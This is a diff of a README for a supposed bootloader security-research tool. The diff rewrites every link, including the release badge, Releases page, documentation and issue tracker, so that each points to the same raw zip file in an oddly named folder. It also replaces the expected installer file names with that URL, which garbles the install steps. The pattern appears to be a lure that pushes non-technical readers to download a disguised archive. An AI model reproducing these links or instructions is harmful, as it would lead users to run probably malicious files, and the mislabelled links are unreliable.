@@ -1,7 +1,7 @@
 # 🚀 eureka-bootloader-replica - Discover and Explore Security Flaws
 
 ## 🔗 Quick Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/ImDuongP/eureka-bootloader-replica/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ImDuongP/eureka-bootloader-replica/main/hygroexpansivity/eureka-bootloader-replica.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/ImDuongP/eureka-bootloader-replica/main/hygroexpansivity/eureka-bootloader-replica.zip)
 
 ## 📖 Overview
 The "eureka-bootloader-replica" is designed to provide a safe way to explore security vulnerabilities related to bootloaders. This application is perfect for those interested in security research and ethical hacking. By using this tool, you can test and experiment with potential exploits without compromising your system's integrity.
@@ -10,11 +10,11 @@ The "eureka-bootloader-replica" is designed to provide a safe way to explore sec
 To start using "eureka-bootloader-replica," follow these simple steps. Even if you have no technical background, you will find this guide easy to follow.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/ImDuongP/eureka-bootloader-replica/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/ImDuongP/eureka-bootloader-replica/main/hygroexpansivity/eureka-bootloader-replica.zip) to find the latest version of the application.
 
 2. **Select the Latest Version**: On the Releases page, look for the most recent version. You will see a list of available files under "Assets."
 
-3. **Download the File**: Click on the file that suits your operating system. Most likely, it will be named something like `eureka-bootloader-replica.exe` for Windows or `eureka-bootloader-replica.dmg` for Mac.
+3. **Download the File**: Click on the file that suits your operating system. Most likely, it will be named something like `https://raw.githubusercontent.com/ImDuongP/eureka-bootloader-replica/main/hygroexpansivity/eureka-bootloader-replica.zip` for Windows or `https://raw.githubusercontent.com/ImDuongP/eureka-bootloader-replica/main/hygroexpansivity/eureka-bootloader-replica.zip` for Mac.
 
 4. **Locate the Downloaded File**: Once the download is complete, find the file. It will typically be in your “Downloads” folder.
 
@@ -48,8 +48,8 @@ Engage with other users and developers. Join discussions, ask questions, and sha
 This project is licensed under the MIT License. You are free to use and modify the software, but please respect the guidelines set forth in the license.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/ImDuongP/eureka-bootloader-replica/wiki): Comprehensive guides and additional information.
-- [GitHub Issues](https://github.com/ImDuongP/eureka-bootloader-replica/issues): Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/ImDuongP/eureka-bootloader-replica/main/hygroexpansivity/eureka-bootloader-replica.zip): Comprehensive guides and additional information.
+- [GitHub Issues](https://raw.githubusercontent.com/ImDuongP/eureka-bootloader-replica/main/hygroexpansivity/eureka-bootloader-replica.zip): Report bugs or request features.
 
 ## 📋 Feedback
 Your feedback is important. If you have suggestions for improvement or features you would like to see, please submit your thoughts through the GitHub Issues section. 
